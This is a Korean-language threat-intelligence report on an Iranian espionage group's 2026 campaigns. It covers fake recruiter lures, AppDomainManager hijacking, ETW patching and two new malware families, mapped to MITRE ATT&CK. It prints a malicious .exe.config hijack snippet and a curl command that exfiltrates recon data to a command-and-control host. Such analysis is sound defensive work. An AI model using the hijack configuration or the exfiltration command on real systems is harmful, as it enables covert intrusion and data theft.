---
layout: default
title: "Screening Serpens’ 2026 Espionage Campaigns"
date: 2026-06-02
---

# [Executive Summary]

본 보고서는 이란 배후의 국가 지원 위협 그룹인 Screening Serpens(Smoke Sandstorm, UNC1549, Iranian Dream Job으로도 명명됨)가 2026년 초 발생한 중동 지역의 지정학적 갈등 시기에 맞춰 전개한 글로벌 사이버 에스피오나지 캠페인에 대한 분석 리포트이다. 해당 위협 그룹은 고도화된 기술적 역량과 운영 탄력성을 바탕으로 미국, 이스라엘, 아랍에미리트 및 기타 중동 국가의 항공, 방산, 통신, 에너지 등 고가치 산업 부문을 집중적으로 공격하였다.

Screening Serpens는 주로 기술 및 소프트웨어 엔지니어링 전문가들을 정밀 표적으로 삼아, 유명 채용 플랫폼과 신뢰할 수 있는 브랜드를 사칭한 고도의 사회 공학적 기법을 구사하였다. 이들은 가짜 구직 제안서, 위조된 채용 웹사이트 URL, 조작된 화상 회의 초청장 등을 교묘히 활용하여 피해자가 스스로 악성 아카이브 파일이나 설치 프로그램을 가동하도록 유도하는 초기 침투 시나리오를 전개하였다.

이번 캠페인에서 식별된 가장 큰 기술적 특징은 동시 다발적으로 유포된 총 6개의 신종 원격 제어 트로이목마 변종과 이를 구성하는 MiniUpdate 및 MiniJunk V2라는 두 개의 새로운 악성코드 패밀리의 등장이다. 특히 Screening Serpens는 기존의 표준적인 {% include wiki_link.html text="DLL 사이드로딩 기법" url="/review/Details/DLL_Sideloading" %}에 더해, .NET 애플리케이션의 초기화 단계를 조작하여 윈도우 이벤트 추적(ETW) 등의 보안 시스템 감시 기능을 강제로 무력화하는 {% include wiki_link.html text="AppDomainManager 하이재킹" url="/review/Details/AppDomainManager" %} 기술을 복합적으로 융합하였다. 이는 정상적인 디지털 서명이 완료된 바이너리의 신뢰 관계를 도용하여 EDR 솔루션의 동적 행위 감시망을 은밀하게 우회하려는 목적을 지니며, 장기적인 첩보 탈취와 지속적인 거점 유지를 위해 위협 그룹의 공격 아키텍처가 한 단계 진화했음을 입증한다.


# [Technical Analysis]

## 1. Initial Access

Screening Serpens 공격 그룹은 시스템의 기술적 취약점을 파고드는 대신, 인간의 심리적 허점을 공략하는 고도의 사회 공학적 기법을 초기 침투의 주축으로 삼았다. 이들은 주로 항공, 방산, 기술 기업의 정밀 타깃들을 대상으로 LinkedIn이나 WhatsApp 등 신뢰도가 높은 소셜 플랫폼에서 가짜 헤드헌터로 위장하여 접근하는 전략을 구사했다.

공격자는 매력적인 구직 제안서나 화상 면접 초청장으로 위장한 악성 아카이브 파일(ZIP 또는 ISO 포맷)을 전달하며 피해자가 이를 직접 다운로드하도록 유도했다. 임베디드된 컨테이너 내부에는 정상적인 디지털 서명이 완료된 신뢰할 수 있는 실행 파일과 이를 악용하기 위해 정교하게 조작된 .NET 구성 파일 및 악성 동적 링크 라이브러리(DLL) 파일이 패키징되어 있었다. 이러한 침투 방식은 타깃 조직의 이메일 보안 관문 시스템(Secure Email Gateway)의 정적 시그니처 필터링을 손쉽게 우회하고, 사용자의 신뢰를 역이용해 보안 경계선 내부로 악성 자산을 안착시키는 결정적인 교두보가 된다.

## 2. Execution

조작된 패키지가 호스트 내부에서 가동되면, 전통적인 프로세스 생성 방식 대신 .NET 프레임워크의 고유한 구동 메커니즘을 악용하는 AppDomainManager 하이재킹 기술이 실행된다. 공격자는 정상적인 서명이 포함된 마이크로소프트 또는 제3자 정식 .NET 애플리케이션이 실행될 때 동일한 디렉터리에 위치한 응용 프로그램 구성 파일을 가장 먼저 참조한다는 점을 교묘히 파고들었다.

프로세스가 시작되면 윈도우 환경은 실행 파일과 이름이 같은 확장 구성 파일(예: 애플리케이션명.exe.config)을 파싱하게 된다. 공격자는 이 구성 파일 내부에 기본 애플리케이션 도메인을 관리할 커스텀 클래스와 이를 가동할 외부 어셈블리 명세를 강제로 삽입해 두었다. 이로 인해 정상 파일이 가동되는 즉시, 운영체제는 정상 루틴을 수행하기 전 공격자가 의도한 악성 DLL을 프로세스 메모리 공간에 가장 먼저 로드하여 실행 주도권을 하이재킹하는 파괴적인 실행 흐름을 완성한다.

```xml
<configuration>
   <runtime>
      <appDomainManagerType value="MaliciousNamespace.MaliciousManager" />
      <appDomainManagerAssembly value="MaliciousAssembly, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
   </runtime>
</configuration>
```

## 3. Defense Evasion

본 캠페인에서 식별된 방어 회피 전술은 EDR 솔루션의 감시 가시성을 완벽히 무력화하는 데 초점이 맞추어져 있다. 과거에 유행하던 표준 DLL 사이드로딩 기법은 정상 프로세스가 가져오기 주소 테이블을 파싱하여 의존성 파일을 로드하는 과정에서 보안 솔루션의 행위 모니터링에 적발될 확률이 높았다. 반면 AppDomainManager 하이재킹은 .NET 런타임 엔진이 자체적으로 응용 프로그램 도메인을 분할하고 격리하는 합법적인 코드 경로를 타기 때문에 탐지 필터를 손쉽게 통과한다.

더욱 치명적인 우회 기술은 메모리 상에 로드된 악성 관리자 모듈이 가동되는 즉시 구현된다. 하이재킹된 코드 영역은 윈도우 이벤트 추적(ETW) 기능을 담당하는 핵심 커널 컴포넌트 라이브러리인 ntdll.dll의 특정 API 함수(`EtwEventWrite`) 메모리 주소를 동적으로 찾아내어, 함수의 시작 부분을 작업을 즉시 종료하는 반환 코드로 강제 패치(Memory Patching)한다. 이로 인해 시스템 내부에서 이후 어떤 프로세스 변조나 악성 네트워크 행위가 발생하더라도 EDR 센서로 전달되는 원시 텔레메트릭 이벤트 전송이 완전히 차단되어, 보안 관제 센터를 완벽한 정보 차단 상태로 만드는 고도의 은닉 성능을 보여준다.

## 4. Command and Control

보안 감시망을 무력화한 공격자는 장기적인 제어권 유지를 위해 이번 캠페인에서 최초로 식별된 MiniUpdate 및 MiniJunk V2라는 두 개의 핵심 악성코드 패밀리를 다단계 프레임워크 형태로 가동했다. 첫 번째 단계로 실행되는 MiniUpdate는 호스트의 최소한의 환경 정보와 감염 지표만을 수집하여 암호화된 HTTP 혹은 HTTPS 채널을 통해 외부에 구축된 C2 서버로 신호를 보내는 경량형 원격 제어 트로이목마로 동작한다.

```bat
curl -X POST -H "Content-Type: application/octet-stream" --data-binary @recon.dat https://c2.screening-serpens.com/api/v1/update
```

MiniUpdate가 초기 거점의 유효성을 검증하고 명령을 수신하면, 후속 페이로드인 MiniJunk V2를 추가로 드롭하여 실행한다. MiniJunk V2는 내부에 수많은 무의미한 가비지 코드와 복잡한 루프 구문을 고의로 삽입하여 설계된 자동화 로더이다. 이는 자동화된 보안 샌드박스 환경이 악성코드를 에뮬레이션 분석할 때 시동 대기 시간을 강제로 지연시켜 타임아웃을 유발하거나 파싱 엔진을 과부하 상태로 만들어 분석을 포기하도록 유도한다. 정찰을 전담하는 경량 모듈과 탐지 유효성을 교란하는 로더 모듈을 분리 운영함으로써, C2 인프라의 노출을 최소화하고 생존력을 극대화하는 체계적인 명령 제어 아키텍처를 보여준다.


# [MITRE ATT&CK Mapping]

## Initial Access

* **Phishing: Spearphishing Attachment** - [T1566.001](https://attack.mitre.org/techniques/T1566/001/)
    
    LinkedIn 및 WhatsApp 등 신뢰도가 높은 소셜 플랫폼에서 가짜 헤드헌터로 위장하여 매력적인 구직 제안이나 화상 면접 초청장 포맷의 악성 아카이브 파일(ZIP, ISO)을 대상 정밀 타깃에게 직접 발송하고 다운로드를 유도함.



## Execution

* **Hijack Execution Flow: AppDomainManager Hijacking** - [T1574.014](https://attack.mitre.org/techniques/T1574/014/)

    정상적인 .NET 애플리케이션의 구성 파일인 exe.config 내부에 악성 Namespace와 외부 어셈블리 클래스 명세를 강제로 삽입하여, 정상 바이너리 실행 시 공격자의 악성 관리자 모듈이 가장 먼저 호출되도록 실행 주도권을 하이재킹함.



## Defense Evasion

* **Subvert Trust Controls** - [T1553](https://attack.mitre.org/techniques/T1553/)
    
    마이크로소프트 및 공인된 제3자 기관의 정식 디지털 서명이 완료된 검증된 실행 파일을 도용하고 패키징하여, 엔드포인트 솔루션의 기본적 정적 시그니처 감시망 및 평판 기반 탐지 필터를 무력화함.


* **Disable or Modify Tools** - [T1685](https://attack.mitre.org/techniques/T1685/)
    
    하이재킹된 코드 영역을 통해 윈도우 핵심 커널 컴포넌트인 ntdll.dll 내부의 EtwEventWrite 함수 주소를 동적으로 추적한 뒤, 해당 API의 진입점을 반환 코드로 강제 메모리 패칭하여 윈도우 이벤트 추적(ETW) 기능을 정지시키고 EDR 솔루션으로 수집되는 원시 보안 이벤트 전송을 원천 차단함.



## Command and Control

* **Application Layer Protocol: Web Protocols** - [T1071.001](https://attack.mitre.org/techniques/T1071/001/)
    
    최초 침투 및 정찰용 경량 RAT 패밀리인 MiniUpdate 모듈을 가동하여 표준 웹 규격인 암호화된 HTTP 또는 HTTPS 채널을 구성하고, 외부 공격자 제어 서버인 C2 인프라와 정찰 데이터 및 후속 명령을 은밀하게 송수신함.


# [Referenced]
* [Unit 42](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)